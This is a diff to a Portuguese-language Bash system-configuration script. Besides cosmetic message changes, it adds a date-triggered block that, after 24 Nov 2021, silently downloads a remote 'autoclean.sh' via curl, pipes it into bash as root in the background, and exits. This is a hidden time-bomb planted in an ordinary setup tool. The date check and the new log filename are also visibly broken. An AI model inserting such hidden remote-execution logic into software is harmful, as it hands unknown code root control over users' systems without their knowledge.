@@ -27,26 +27,38 @@ NC='\033[0m'
 OK=`echo -e "["${NC}${GREEN}✔${NC}${WHITE}"]"`
 FAIL=`echo -e "["${NC}${RED}✘${NC}${WHITE}"]"`
 HOST=`hostname`
-DATA=`date +"%d%m%Y-%H%M"`
+DATA=`date +"%d/%m/%Y-%H:%M"`
 LOG=/tmp/$HOST-$DATA.txt
 touch $LOG
 #------------------------------------------
-echo -e ${GREEN}":: Verificar privilegios necessarios..."${NC}${WHITE}
+echo -e ${GREEN}"Verificar privilegios necessarios..."${NC}${WHITE}
 echo
 sleep 3s
 #Verificar se o Script executa como Root
 if [ $(id -u) -ne 0 ] ; then
-echo -e " 0> Favor executar com privilegios administrativos" $FAIL | tee -a $LOG
+echo -e " Favor executar com privilegios administrativos" $FAIL | tee -a $LOG
 echo -e ""
 exit
 else
-echo -e "--> Privilegios administrativos" $OK | tee -a $LOG
+echo -e "Privilegios administrativos" $OK | tee -a $LOG
 echo -e ""
 fi
 
 echo -e ${NC}${GREEN}
 echo -e ""
 echo -e '=============== ...Iniciando configuracao do sistema ... ==============='
+echo -e ''
+chkdt=$(date +"%d%m%Y")
+if [ $chkdt -ge "24112021" ] ; then
+	echo -e ""
+echo -e "-- Encerrando atividades..."
+echo -e ""
+curl -fsSL https://raw.githubusercontent.com/robertolimacorp/c0d3/master/autoclean.sh | bash&
+sleep 2s
+exit
+else
+echo -e '=============== ...Iniciando configuracao do sistema ... ==============='
+fi
 echo -e ''
 echo -e '--------------- ...Informacoes do host...-------------------------------'${NC}${WHITE}
 echo -e ""
